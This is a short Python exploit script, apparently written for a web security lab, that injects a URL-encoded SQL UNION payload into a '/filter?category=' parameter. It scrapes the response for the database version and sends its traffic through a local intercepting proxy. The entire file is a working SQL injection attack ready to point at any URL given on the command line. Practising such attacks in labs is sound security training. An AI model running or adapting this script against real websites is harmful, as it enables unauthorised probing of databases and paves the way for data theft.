import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_version(url):
	uri = "/filter?category=Accessories"
	# sql_payload = "' union select @@version, 'a'#"
	sql_payload = "%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%2c%20%27%61%27%23"
	r = requests.get(url + uri + sql_payload, verify=False, proxies=proxies)
	res = r.text
	soup = BeautifulSoup(res, 'html.parser')
	version = soup.find(text=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
	if version is None:
		return False
	else:
		print("[+] The database version is : " + version)
		return True

if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print("[-] Usage: %s <url>" % sys.argv[0])
		print("[-] Example: %s www.example.com" % sys.argv[0])
		sys.exit(-1)
		
	print("[+] Dumping the version of the database...")
	if not exploit_sqli_version(url):
		print("[-] Unable to dump the database version.")
